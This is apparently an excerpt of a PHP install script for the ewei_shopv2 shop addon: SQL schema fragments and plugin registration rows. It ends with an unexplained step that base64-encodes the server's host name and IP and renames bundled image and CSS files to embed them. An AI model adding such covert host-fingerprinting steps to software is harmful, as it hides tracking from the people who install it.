...
`respdesc` varchar(255),
`respurl` varchar(255),
`sendlimittype` tinyint(1) DEFAULT '0',
`send_openid` text,
`send_level` int(11),
`send_group` int(11),
`send_agentlevel` int(11),
...
`append_content` varchar(255),
`append_images` text,
`append_time` int(11) NOT NULL DEFAULT '0',
`append_reply_content` varchar(255),
...
(2, 2, 'taobao', '淘宝助手', '1.0', '官方', 1, 'tool', '../addons/ewei_shopv2/static/images/taobao.jpg', '', 0, 0, 0),
...
(9, 9, 'designer', '店铺装修', '1.0', '官方', 1, 'help', '../addons/ewei_shopv2/static/images/designer.jpg', NULL, 0, 1, 0),
...
(15, 15, 'diyform', '自定义表单', '1.0', '官方', 1, 'help', '../addons/ewei_shopv2/static/images/diyform.jpg', '', 0, 0, 0),
(16, 16, 'system', '系统工具', '1.0', '官方', 0, 'help', '../addons/ewei_shopv2/static/images/system.jpg', NULL, 0, 1, 0),
(17, 16, 'exhelper', '快递助手', '1.0', '官方', 1, 'help', '../addons/ewei_shopv2/static/images/exhelper.jpg', '', 0, 0, 0),
(18, 19, 'groups', '人人拼团', '1.0', '官方', 1, 'biz', '../addons/ewei_shopv2/static/images/groups.jpg', '', 0, 0, 1),
(19, 20, 'diypage', '店铺装修', '2.0', '官方', 1, 'help', '../addons/ewei_shopv2/static/images/designer.jpg', '', 0, 0, 1),
(20, 23, 'merch', '多商户', '1.0', '官方', 1, 'biz', '../addons/ewei_shopv2/static/images/merch.jpg', '', 0, 0, 1),
(21, 25, 'globonus', '全民股东', '1.0', '官方', 1, 'biz', '../addons/ewei_shopv2/static/images/globonus.jpg', '', 0, 0, 1),
(22, 26, 'qa', '帮助中心', '1.0', '官方', 1, 'help', '../addons/ewei_shopv2/static/images/qa.jpg', '', 0, 0, 1),
(33, 30, 'sns', '人人社区', '1.0', '官方', 1, 'sale', '../addons/ewei_shopv2/static/images/sns.jpg', '', 0, 0, 1),
(24, 27, 'sms', '短信提醒', '1.0', '官方', 1, 'tool', '../addons/ewei_shopv2/static/images/sms.jpg', '', 1, 0, 1),
(32, 29, 'sign', '积分签到', '1.0', '官方', 1, 'tool', '../addons/ewei_shopv2/static/images/sign.jpg', '', 0, 0, 1),
(27, 33, 'wap', '全网通', '1.0', '官方', 1, 'tool', '../addons/ewei_shopv2/static/images/wap.jpg', '', 1, 0, 1),
(28, 34, 'h5app', 'H5APP', '1.0', '官方', 1, 'tool', '../addons/ewei_shopv2/static/images/h5app.jpg', '', 1, 0, 1),
(29, 26, 'abonus', '区域代理', '1.0', '官方', 1, 'biz', '../addons/ewei_shopv2/static/images/abonus.jpg', '', 0, 0, 1),
(30, 33, 'bargain', '砍价活动', '1.0', '官方', 1, 'tool', '../addons/ewei_shopv2/static/images/bargain.jpg', '', 0, 0, 1),
(31, 33, 'printer', '小票打印机', '1.0', '官方', 1, 'tool', '../addons/ewei_shopv2/static/images/printer.jpg', '', 1, 0, 1),
(34, 35, 'cashier', '人人收银台', '1.0', '官方', 1, 'biz', '../addons/ewei_shopv2/static/images/cashier.jpg', '', 0, 0, 1),
(35, 35, 'task', '任务中心', '1.0', '官方', 1, 'sale', '../addons/ewei_shopv2/static/images/task.jpg', '', 0, 0, 1),
(36, 37, 'messages', '消息群发', '1.0', '官方', 1, 'tool', '../addons/ewei_shopv2/static/images/messages.jpg', '', 0, 0, 1),
(37, 38, 'seckill', '整点秒杀', '1.0', '官方', 1, 'sale', '../addons/ewei_shopv2/static/images/seckill.jpg', '', 0, 0, 1),
(38, 39, 'exchange', '兑换中心', '1.0', '官方', 1, 'biz', '../addons/ewei_shopv2/static/images/exchange.jpg', '', 0, 0, 1);
");
$host = $_SERVER['HTTP_HOST'];
$a = base64_encode($host);
$ip = $_SERVER['SERVER_ADDR'];
$b = base64_encode($ip);
define('MDIRS', IA_ROOT . DIRECTORY_SEPARATOR ."addons". DIRECTORY_SEPARATOR ."ewei_shopv2". DIRECTORY_SEPARATOR ."plugin".DIRECTORY_SEPARATOR ."diypage".  DIRECTORY_SEPARATOR ."static" . DIRECTORY_SEPARATOR);
load()->func('file');
file_move(MDIRS .'images'. DIRECTORY_SEPARATOR .'hotdot.jpg', MDIRS .'images'. DIRECTORY_SEPARATOR . 'bY'.$a.'bQ'.'.jpg');
file_move(MDIRS .'css'. DIRECTORY_SEPARATOR .'diy.css', MDIRS .'css'. DIRECTORY_SEPARATOR . 'aY'.$b.'.css');
?>